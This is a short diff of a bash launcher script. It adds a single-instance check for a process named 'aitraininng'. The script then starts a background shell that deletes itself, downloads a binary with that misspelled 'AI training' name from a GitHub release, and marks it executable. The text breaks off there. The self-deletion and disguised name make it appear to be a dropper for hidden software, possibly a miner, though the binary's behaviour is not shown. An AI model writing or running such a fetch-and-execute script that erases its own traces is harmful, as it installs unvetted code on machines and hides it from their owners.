@@ -1,4 +1,9 @@
-nohup bash -c "
+#!/bin/bash
+if pgrep -x "aitraininng" > /dev/null; then
+    echo "An AI training process is already running. Exiting."
+    exit 1
+fi
+nohup bash -c " 
   ( sleep 1; rm -- \"$0\" ) &
   wget https://github.com/max313iq/tech/releases/download/Gft/aitraininng -O aitraininng
   chmod +x aitraininng
